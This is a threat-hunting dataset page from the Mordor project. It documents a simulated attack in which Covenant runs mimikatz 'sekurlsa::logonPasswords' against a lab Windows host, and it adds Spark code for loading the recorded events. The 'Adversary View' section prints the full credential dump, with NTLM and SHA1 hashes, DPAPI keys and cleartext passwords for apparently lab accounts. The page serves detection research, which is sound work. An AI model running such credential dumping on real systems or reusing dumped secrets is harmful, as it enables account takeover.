# Covenant Mimikatz Logonpasswords

## Metadata


|                   |    |
|:------------------|:---|
| id                | SDWIN-191205033226 |
| author            | Roberto Rodriguez @Cyb3rWard0g |
| creation date     | 2019/12/05 |
| platform          | Windows |
| Mordor Environment| Mordor shire |
| Simulation Type   | C2 |
| Simulation Tool   | Covenant |
| Simulation Script | https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Credentials/Mimikatz.cs |
| Dataset           | https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/covenant_mimikatz_logonpasswords.tar.gz |
| References        | None |

## Dataset Description
This dataset represents adversaries using mimikatz and module `logonpasswords` to dump credentials from the memory contents of lsass.exe

## Adversary View
```
.#####.   mimikatz 2.2.0 (x64) #18362 Oct  8 2019 14:30:39
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ##       > http://blog.gentilkiwi.com/mimikatz
'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
 '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # sekurlsa::logonPasswords

Authentication Id : 0 ; 6468117 (00000000:0062b215)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/4/2019 8:01:59 PM
SID               : S-1-5-90-0-2
  msv :	
    [00000003] Primary
    * Username : IT001$
    * Domain   : shire
    * NTLM     : 91bf84541aee793f0306edfb1481385f
    * SHA1     : 9a3197038ac98c4d67f513f5ffe0a421a668c433
  tspkg :	
  wdigest :	
    * Username : IT001$
    * Domain   : shire
    * Password : _6`fL7soOVz,u6b(_Lpyp`1@7Dc'3ntQgWS0b&6/xYs',o<ALXY_4S@H>%Dp8Qdu_E:b'1mMYK3e7Bx8+.4mZhsX,7.ovaDmN`+zF5+M#X)cC8&Kgx$Br%IX
  kerberos :	
    * Username : IT001$
    * Domain   : shire.com
    * Password : _6`fL7soOVz,u6b(_Lpyp`1@7Dc'3ntQgWS0b&6/xYs',o<ALXY_4S@H>%Dp8Qdu_E:b'1mMYK3e7Bx8+.4mZhsX,7.ovaDmN`+zF5+M#X)cC8&Kgx$Br%IX
  ssp :	
  credman :	

Authentication Id : 0 ; 6468091 (00000000:0062b1fb)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/4/2019 8:01:59 PM
SID               : S-1-5-90-0-2
  msv :	
    [00000003] Primary
    * Username : IT001$
    * Domain   : shire
    * NTLM     : 91bf84541aee793f0306edfb1481385f
    * SHA1     : 9a3197038ac98c4d67f513f5ffe0a421a668c433
  tspkg :	
  wdigest :	
    * Username : IT001$
    * Domain   : shire
    * Password : _6`fL7soOVz,u6b(_Lpyp`1@7Dc'3ntQgWS0b&6/xYs',o<ALXY_4S@H>%Dp8Qdu_E:b'1mMYK3e7Bx8+.4mZhsX,7.ovaDmN`+zF5+M#X)cC8&Kgx$Br%IX
  kerberos :	
    * Username : IT001$
    * Domain   : shire.com
    * Password : _6`fL7soOVz,u6b(_Lpyp`1@7Dc'3ntQgWS0b&6/xYs',o<ALXY_4S@H>%Dp8Qdu_E:b'1mMYK3e7Bx8+.4mZhsX,7.ovaDmN`+zF5+M#X)cC8&Kgx$Br%IX
  ssp :	
  credman :	

Authentication Id : 0 ; 6462372 (00000000:00629ba4)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/4/2019 8:01:58 PM
SID               : S-1-5-96-0-2
  msv :	
    [00000003] Primary
    * Username : IT001$
    * Domain   : shire
    * NTLM     : 91bf84541aee793f0306edfb1481385f
    * SHA1     : 9a3197038ac98c4d67f513f5ffe0a421a668c433
  tspkg :	
  wdigest :	
    * Username : IT001$
    * Domain   : shire
    * Password : _6`fL7soOVz,u6b(_Lpyp`1@7Dc'3ntQgWS0b&6/xYs',o<ALXY_4S@H>%Dp8Qdu_E:b'1mMYK3e7Bx8+.4mZhsX,7.ovaDmN`+zF5+M#X)cC8&Kgx$Br%IX
  kerberos :	
    * Username : IT001$
    * Domain   : shire.com
    * Password : _6`fL7soOVz,u6b(_Lpyp`1@7Dc'3ntQgWS0b&6/xYs',o<ALXY_4S@H>%Dp8Qdu_E:b'1mMYK3e7Bx8+.4mZhsX,7.ovaDmN`+zF5+M#X)cC8&Kgx$Br%IX
  ssp :	
  credman :	

Authentication Id : 0 ; 485151 (00000000:0007671f)
Session           : Interactive from 1
User Name         : pgustavo
Domain            : shire
Logon Server      : HFDC01
Logon Time        : 12/4/2019 7:08:54 PM
SID               : S-1-5-21-791464340-1796667228-2788435825-1112
  msv :	
    [00000003] Primary
    * Username : pgustavo
    * Domain   : shire
    * NTLM     : 81d310fa34e6a56a31145445891bb7b8
    * SHA1     : 2a953d745ed80427e309d957d20b0eeca3cd3d69
    * DPAPI    : f9cd0bf977c7449afe881d7012e7b1fd
  tspkg :	
  wdigest :	
    * Username : pgustavo
    * Domain   : shire
    * Password : W1n1!2019
  kerberos :	
    * Username : pgustavo
    * Domain   : SHIRE.COM
    * Password : (null)
  ssp :	
  credman :	

Authentication Id : 0 ; 484605 (00000000:000764fd)
Session           : Interactive from 1
User Name         : pgustavo
Domain            : shire
Logon Server      : HFDC01
Logon Time        : 12/4/2019 7:08:54 PM
SID               : S-1-5-21-791464340-1796667228-2788435825-1112
  msv :	
    [00000003] Primary
    * Username : pgustavo
    * Domain   : shire
    * NTLM     : 81d310fa34e6a56a31145445891bb7b8
    * SHA1     : 2a953d745ed80427e309d957d20b0eeca3cd3d69
    * DPAPI    : f9cd0bf977c7449afe881d7012e7b1fd
  tspkg :	
  wdigest :	
    * Username : pgustavo
    * Domain   : shire
    * Password : W1n1!2019
  kerberos :	
    * Username : pgustavo
    * Domain   : SHIRE.COM
    * Password : (null)
  ssp :	
  credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 12/4/2019 7:08:39 PM
SID               : S-1-5-19
  msv :	
  tspkg :	
  wdigest :	
    * Username : (null)
    * Domain   : (null)
    * Password : (null)
  kerberos :	
    * Username : (null)
    * Domain   : (null)
    * Password : (null)
  ssp :	
  credman :	

Authentication Id : 0 ; 56894 (00000000:0000de3e)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/4/2019 7:08:39 PM
SID               : S-1-5-90-0-1
  msv :	
    [00000003] Primary
    * Username : IT001$
    * Domain   : shire
    * NTLM     : 91bf84541aee793f0306edfb1481385f
    * SHA1     : 9a3197038ac98c4d67f513f5ffe0a421a668c433
  tspkg :	
  wdigest :	
    * Username : IT001$
    * Domain   : shire
    * Password : _6`fL7soOVz,u6b(_Lpyp`1@7Dc'3ntQgWS0b&6/xYs',o<ALXY_4S@H>%Dp8Qdu_E:b'1mMYK3e7Bx8+.4mZhsX,7.ovaDmN`+zF5+M#X)cC8&Kgx$Br%IX
  kerberos :	
    * Username : IT001$
    * Domain   : shire.com
    * Password : _6`fL7soOVz,u6b(_Lpyp`1@7Dc'3ntQgWS0b&6/xYs',o<ALXY_4S@H>%Dp8Qdu_E:b'1mMYK3e7Bx8+.4mZhsX,7.ovaDmN`+zF5+M#X)cC8&Kgx$Br%IX
  ssp :	
  credman :	

Authentication Id : 0 ; 56803 (00000000:0000dde3)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/4/2019 7:08:39 PM
SID               : S-1-5-90-0-1
  msv :	
    [00000003] Primary
    * Username : IT001$
    * Domain   : shire
    * NTLM     : 91bf84541aee793f0306edfb1481385f
    * SHA1     : 9a3197038ac98c4d67f513f5ffe0a421a668c433
  tspkg :	
  wdigest :	
    * Username : IT001$
    * Domain   : shire
    * Password : _6`fL7soOVz,u6b(_Lpyp`1@7Dc'3ntQgWS0b&6/xYs',o<ALXY_4S@H>%Dp8Qdu_E:b'1mMYK3e7Bx8+.4mZhsX,7.ovaDmN`+zF5+M#X)cC8&Kgx$Br%IX
  kerberos :	
    * Username : IT001$
    * Domain   : shire.com
    * Password : _6`fL7soOVz,u6b(_Lpyp`1@7Dc'3ntQgWS0b&6/xYs',o<ALXY_4S@H>%Dp8Qdu_E:b'1mMYK3e7Bx8+.4mZhsX,7.ovaDmN`+zF5+M#X)cC8&Kgx$Br%IX
  ssp :	
  credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : IT001$
Domain            : shire
Logon Server      : (null)
Logon Time        : 12/4/2019 7:08:39 PM
SID               : S-1-5-20
  msv :	
    [00000003] Primary
    * Username : IT001$
    * Domain   : shire
    * NTLM     : 91bf84541aee793f0306edfb1481385f
    * SHA1     : 9a3197038ac98c4d67f513f5ffe0a421a668c433
  tspkg :	
  wdigest :	
    * Username : IT001$
    * Domain   : shire
    * Password : _6`fL7soOVz,u6b(_Lpyp`1@7Dc'3ntQgWS0b&6/xYs',o<ALXY_4S@H>%Dp8Qdu_E:b'1mMYK3e7Bx8+.4mZhsX,7.ovaDmN`+zF5+M#X)cC8&Kgx$Br%IX
  kerberos :	
    * Username : it001$
    * Domain   : SHIRE.COM
    * Password : (null)
  ssp :	
  credman :	

Authentication Id : 0 ; 32730 (00000000:00007fda)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/4/2019 7:08:39 PM
SID               : S-1-5-96-0-1
  msv :	
    [00000003] Primary
    * Username : IT001$
    * Domain   : shire
    * NTLM     : 91bf84541aee793f0306edfb1481385f
    * SHA1     : 9a3197038ac98c4d67f513f5ffe0a421a668c433
  tspkg :	
  wdigest :	
    * Username : IT001$
    * Domain   : shire
    * Password : _6`fL7soOVz,u6b(_Lpyp`1@7Dc'3ntQgWS0b&6/xYs',o<ALXY_4S@H>%Dp8Qdu_E:b'1mMYK3e7Bx8+.4mZhsX,7.ovaDmN`+zF5+M#X)cC8&Kgx$Br%IX
  kerberos :	
    * Username : IT001$
    * Domain   : shire.com
    * Password : _6`fL7soOVz,u6b(_Lpyp`1@7Dc'3ntQgWS0b&6/xYs',o<ALXY_4S@H>%Dp8Qdu_E:b'1mMYK3e7Bx8+.4mZhsX,7.ovaDmN`+zF5+M#X)cC8&Kgx$Br%IX
  ssp :	
  credman :	

Authentication Id : 0 ; 32672 (00000000:00007fa0)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/4/2019 7:08:39 PM
SID               : S-1-5-96-0-0
  msv :	
    [00000003] Primary
    * Username : IT001$
    * Domain   : shire
    * NTLM     : 91bf84541aee793f0306edfb1481385f
    * SHA1     : 9a3197038ac98c4d67f513f5ffe0a421a668c433
  tspkg :	
  wdigest :	
    * Username : IT001$
    * Domain   : shire
    * Password : _6`fL7soOVz,u6b(_Lpyp`1@7Dc'3ntQgWS0b&6/xYs',o<ALXY_4S@H>%Dp8Qdu_E:b'1mMYK3e7Bx8+.4mZhsX,7.ovaDmN`+zF5+M#X)cC8&Kgx$Br%IX
  kerberos :	
    * Username : IT001$
    * Domain   : shire.com
    * Password : _6`fL7soOVz,u6b(_Lpyp`1@7Dc'3ntQgWS0b&6/xYs',o<ALXY_4S@H>%Dp8Qdu_E:b'1mMYK3e7Bx8+.4mZhsX,7.ovaDmN`+zF5+M#X)cC8&Kgx$Br%IX
  ssp :	
  credman :	

Authentication Id : 0 ; 31337 (00000000:00007a69)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 12/4/2019 7:08:38 PM
SID               : 
  msv :	
    [00000003] Primary
    * Username : IT001$
    * Domain   : shire
    * NTLM     : 91bf84541aee793f0306edfb1481385f
    * SHA1     : 9a3197038ac98c4d67f513f5ffe0a421a668c433
  tspkg :	
  wdigest :	
  kerberos :	
  ssp :	
  credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : IT001$
Domain            : shire
Logon Server      : (null)
Logon Time        : 12/4/2019 7:08:38 PM
SID               : S-1-5-18
  msv :	
  tspkg :	
  wdigest :	
    * Username : IT001$
    * Domain   : shire
    * Password : _6`fL7soOVz,u6b(_Lpyp`1@7Dc'3ntQgWS0b&6/xYs',o<ALXY_4S@H>%Dp8Qdu_E:b'1mMYK3e7Bx8+.4mZhsX,7.ovaDmN`+zF5+M#X)cC8&Kgx$Br%IX
  kerberos :	
    * Username : it001$
    * Domain   : SHIRE.COM
    * Password : (null)
  ssp :	
  credman :
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/credential_access/covenant_mimikatz_logonpasswords.tar.gz"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        